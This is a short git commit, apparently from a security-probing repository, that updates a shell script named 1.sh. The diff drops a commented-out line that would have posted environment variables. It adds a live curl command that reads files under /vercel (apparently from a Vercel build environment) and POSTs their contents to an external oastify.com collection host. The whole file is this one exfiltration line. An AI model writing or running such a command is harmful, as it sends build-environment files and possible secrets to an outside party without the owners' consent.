588848e3ab791180b711ad34db644f8c5b903eed
Security testing <118594933+w2h3@users.noreply.github.com>
2024-01-19 16:44:03 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-##curl -X POST -d "$(env)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+curl -X POST -d "$(printf '/vercel/.yarn' && cat /vercel.yarn && printf '/vercel/.local' && cat /vercel/.local)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
